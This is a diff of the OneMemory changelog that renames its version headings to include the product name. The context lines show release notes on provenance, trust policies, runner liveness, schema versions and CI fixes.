 `<db>.pre-v15-backup` is made first; no downgrade path). Everything else is additive.
@@ -663,7 +1052,7 @@ Closes every gap the 1.5.0 benchmark recorded, without ever changing a memory si
 - OneMemory does not guess that a new note replaces an old one. Writing a second note and leaving the first still returns both (as before); replace
   explicitly if you want the old one out of sight.
 
-## [1.5.0] - 2026-10-25
+## [OneMemory 1.5.0] - 2026-10-25
 
 A benchmark for the question "can one agent silently turn a weak guess into shared truth?". Additive only: no
 schema change, no change to any existing result shape or default.
@@ -688,7 +1077,7 @@ schema change, no change to any existing result shape or default.
   marker and are listed in the README: `GAP-SUPERSEDE`, `GAP-RECENCY`, `GAP-HISTORY`, `GAP-CONFIDENCE` (a fifth, `GAP-REST-CAS`, was found and fixed in this release).
   They do not fail the run; a marked scenario that starts to pass does.
 
-## [1.4.2] - 2026-10-24
+## [OneMemory 1.4.2] - 2026-10-24
 
 A third expert review of 1.4.1 (coding, security, architecture, developer experience, infrastructure) found
 the holes below; every confirmed one is fixed. **Upgrading from 1.3.x: read
@@ -783,7 +1172,7 @@ change in a minor release.
   `clear-taint` command, hiding admin-only tools from a non-admin `tools/list`, and reserving the runner
   namespace were reviewed and left for a later version.
 
-## [1.4.1] - 2026-10-24
+## [OneMemory 1.4.1] - 2026-10-24
 
 A second expert review of 1.4.0 (coding, security, architecture, developer experience, infrastructure) found
 real holes in the trust feature. All are fixed here; schema is **unchanged at v14** (an idempotent
@@ -878,7 +1267,7 @@ The distrust list is still a policy on labels; a file that omits every writer fi
 an old signed export is possible (`not_after` retires a key, not a note); the heartbeat check trusts the
 `runner` label, which anyone holding that token can use. Windows and macOS were not exercised in this review.
 
-## [1.4.0] - 2026-10-24
+## [OneMemory 1.4.0] - 2026-10-24
 
 Trust. A server can now say whom not to believe, name writers across servers, and vouch for
 the writers it exports; the runner liveness signal is per machine. **Schema v14** (was v13): read
@@ -934,7 +1323,7 @@ Attestations prove who signed what, not that content is true; they have no revoc
 The distrust list is a policy on labels, not a boundary against the operator. Cost of `not_written_by` and
 `note_*` filters grows with the feed window (measured 110 to 580 ms on 300,000 events).
 
-## [1.3.4] - 2026-10-24
+## [OneMemory 1.3.4] - 2026-10-24
 
 "Runner offline, N commands waiting." An approved command task used to wait
 silently when the PC was off or asleep. Now the store says so. No schema version
@@ -992,7 +1381,7 @@ change from 1.3.3 (still v13). Also tightens 1.3.3's "who wrote this" after revi
 `distrust_writers` policy, signed writer attestations, stable cross-server writer ids,
 per-target runner heartbeats. See docs/provenance.md.
 
-## [1.3.3] - 2026-10-24
+## [OneMemory 1.3.3] - 2026-10-24
 
 "Who wrote this?" A note now records which connection wrote it, stamped by the
 server so a client cannot forge it. **Schema is now v13** (additive columns; see
@@ -1029,7 +1418,7 @@ before upgrading.
 ### Not included
 - A `distrust_writers` trust policy or per-note trust flag (idea only; see docs/provenance.md).
 
-## [1.3.2] - 2026-10-24
+## [OneMemory 1.3.2] - 2026-10-24
 
 Test-only fix for Windows CI. No runner/allowlist change, no schema change (still v12).
 
@@ -1039,7 +1428,7 @@ Test-only fix for Windows CI. No runner/allowlist change, no schema change (stil
 ### Tests
 - Added a regression test for the Windows-style path against the pattern (and injection strings still rejected); the main command-task test now prints the runner's result if the marker is missing.
 
-## [1.3.1] - 2026-10-24
+## [OneMemory 1.3.1] - 2026-10-24
 
 Fix release: package name, CI, and Windows. No schema change (still v12).
 
@@ -1054,7 +1443,7 @@ Fix release: package name, CI, and Windows. No schema change (still v12).
 - The SIGTERM graceful-drain test is skipped on Windows only, which has no SIGTERM (a kill there is a hard terminate). It still runs on Linux and macOS.
 - Windows was not run locally; these fixes are reasoned from the CI log, not executed on Windows.
 
-## [1.3.0] - 2026-10-24
+## [OneMemory 1.3.0] - 2026-10-24
 
 Cross-device / cross-model awareness: every session can see what the others
 did and plan, and a task can now drive the PC's runner. Tasks, handoffs, leases
@@ -1196,7 +1585,7 @@ with the exceptions listed under "Changed".
   chat window (chat clients still act only on a user turn); the systemd and Task
   Scheduler recipes were written but not run.
 
-## [1.2.1] - 2026-10-24
+## [OneMemory 1.2.1] - 2026-10-24
 
 **Package name:** the npm package is `onememory-mcp` (the command is `onememory`). An earlier version of this note claimed a rename to a scoped name; that was wrong. Neither the plain `onememory` name nor a scoped name was ever published.
 
@@ -1292,7 +1681,7 @@ release). Docs were corrected to match what actually ships.
   publish unless the tag equals the `package.json` version, and documents the
   exact npm Trusted Publisher settings it depends on.
 
-## [1.2.0] - 2026-10-22
+## [OneMemory 1.2.0] - 2026-10-22
 
 ### Encryption at rest, retention, per-token namespaces
 
@@ -1387,7 +1776,7 @@ Prompted by community feedback about stores with months of accumulated edits.
   publish workflow installs on purpose); it now accepts both shapes, verified
   against npm 11.16.0 and 12.2.1.
 
-## [1.1.0] - 2026-10-16
+## [OneMemory 1.1.0] - 2026-10-16
 
 ### Upgrade notes
 
@@ -1628,7 +2017,7 @@ Prompted by community feedback about stores with months of accumulated edits.
   `precomputeTfMaps()` helper — the tokenizer no longer runs inside any
   pair loop.
 
-## [1.0.0] — 2026-10-15
+## [OneMemory 1.0.0] — 2026-10-15
 
 First public version.
 
